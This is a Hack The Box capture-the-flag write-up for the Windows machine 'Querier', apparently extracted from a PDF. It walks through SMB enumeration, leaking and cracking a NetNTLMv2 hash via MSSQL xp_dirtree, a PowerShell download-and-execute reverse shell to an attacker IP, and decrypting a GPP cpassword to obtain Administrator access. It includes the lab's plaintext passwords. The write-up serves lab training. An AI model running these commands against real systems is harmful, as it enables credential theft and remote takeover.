@@ -1,0 +1,164 @@
+Querier
+
+29th May 2019 / Document No D19.100.26
+
+Prepared By: MinatoTW
+Machine Author: egre55 & mrh4sh
+Difficulty: M edium
+Classification: Official
+
+                                                                        Page 1 / 12
+SYNOPSIS
+
+Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable
+file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The
+SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and
+cracked to recover the plaintext password. After logging in, PowerUp can be used to find
+Administrator credentials in a locally cached group policy file.
+
+Skills Required   Skills Learned
+
+     Enumeration       Excel macros
+                       PowerView
+
+                                     Page 2 / 12
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.125 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr '\n' ' ,' | sed s/,$//)
+ map -sC -sV -p$ ports 10.10.10.125
+
+There's SMB and WinRM open among other common ports. MSSQL is running too which confirms
+that the domain is HTB.LOCAL.
+
+                                                                                                                  Page 3 / 12
+SMB
+
+smbclient is used to bind using a null session and list available shares.
+ smbclient -N -L \\\\10.10.10.125
+
+We find the Reports share among other common shares. Connect to it to see the contents.
+ smbclient -N \\\\10.10.10.125\\Reports
+
+There's an xlsm file which is a macro-enabled Excel spreadsheet. Download it to examine.
+
+                                                                                                                  Page 4 / 12
+INVESTIGATING THE SPREADSHEET
+
+The spreadsheet is extracted.
+ unzip Currency\ Volume\ Report.xlsm
+
+Macros are usually stored at xl/vbaProject.bin. Use strings on it to find all readable strings.
+ strings xl/vbaProject.bin
+Close to the top the connection string can be found with the credentials.
+Using these we can now login using impacket mssqlclient.py, use -windows-auth as it's the
+default mode of authentication for SQL Server.
+
+                                                                                                                  Page 5 / 12
+We can use xp_cmdshell utility to execute commands through the SQL server. Let's try that out.
+
+However, we are denied access. This is because we aren't an SA level user and don't have
+permissions to enable xp_cmdshell. Let's see users who have SA privilege.
+ select IS_SRVROLEMEMBER (' sysadmin')
+
+We see that we don't have SA privileges. Though we can't execute commands using
+xp_cmdshell we can steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.
+ exec xp_dirtree ' \\10.10.16.2\share\file'
+ exec xp_fileexist ' \\10.10.16.2\share\file'
+And fire up Responder locally.
+
+                                                                                                                  Page 6 / 12
+CRACKING THE HASH
+
+Copy the hash into a file to crack it. And use John the Ripper to crack the hash and rockyou.txt as
+the wordlist.
+ john hash -w=rockyou.txt
+The hash is cracked as "corporate568".
+
+                                                                                                                  Page 7 / 12
+FOOTHOLD
+
+Using the creds mssql-svc / corporate568 we can now login to MSSQL. Let's check if we have SA
+permissions now.
+ select IS_SRVROLEMEMBER ('sysadmin')
+
+And we see that it returns true. Now, to execute commands use xp_cmdshell.
+ mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
+ enable_xp_cmdshell
+ xp_cmdshell whoami
+
+Now we can execute a TCP Reverse shell from Nishang. Download the script and add this line to
+the end of it.
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444
+Now run a simple HTTP Server and execute it using powershell.
+ python3 -m http.server 80
+ xp_cmdshell powershell iex(new-object
+
+                                                                                                                  Page 8 / 12
+ net.webclient).downloadstring(\ "http://10.10.16.2/Invoke-PowerShellTcp.ps1\")
+And we have a shell.
+
+                                                                                                                  Page 9 / 12
+PRIVILEGE ESCALATION
+
+After getting a shell, P owerUp.ps1 is used to enumerate further. Download the script and execute
+it on the server using Invoke-AllChecks.
+
+ wget
+ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/P
+ owerUp.ps1
+ echo Invoke-AllChecks >> PowerUp.ps1
+ python3 -m http.server 80
+ iex(new-object
+ net.webclient).downloadstring("http://10.10.16.2/PowerUp.ps1")
+After the script runs it finds credentials in the cached Group Policy Preference file,
+
+If sysadmins attempt to mitigate the GPP vulnerability by deleting the associated GPO, the
+cached groups.xml files will remain on the end points. However, if the GPO containing the GPP
+setting is unlinked from the GPO, the cached groups.xml files will be removed.
+This can be done manually too,
+ cat 'C:\ProgramData\Microsoft\Group
+ Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\G
+ roups\Groups.xml'
+
+                                                                                                                 Page 10 / 12
+Copy the value for cpassword and put into this script,
+
+ from Crypto.Cipher import AES
+ from base64 import b64decode
+
+ cpassword =
+ "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74K
+ eUWc2+BeOVDQ"
+
+ # From MSDN:
+ http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4b
+ e%28v=PROT.13%29#endNote2
+ key = " ""
+ 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
+ f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
+ """. replace(" ", "") .replace("\n"," ").decode('hex')
+
+ # Add padding to the base64 string and decode it
+ cpassword += " =" * ((4 - len(cpassword) % 4) % 4)
+ password = b64decode(cpassword)
+
+ # Decrypt the password
+ o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
+
+ # Print it
+ print o[:-ord(o[-1])].decode('utf16')
+
+It uses the predefined key and known AES algorithm to decrypt the password. Running the script
+gets the password,
+
+Using the credentials Administrator:MyUnclesAreMarioAndLuigi!!1! , we can now login as
+the local Administrator via psexec.
+
+ psexec.py Administrator:' MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
+
+                                                                                                                 Page 11 / 12
+And we have a SYSTEM shell.
+                                                                                                                 Page 12 / 12
+
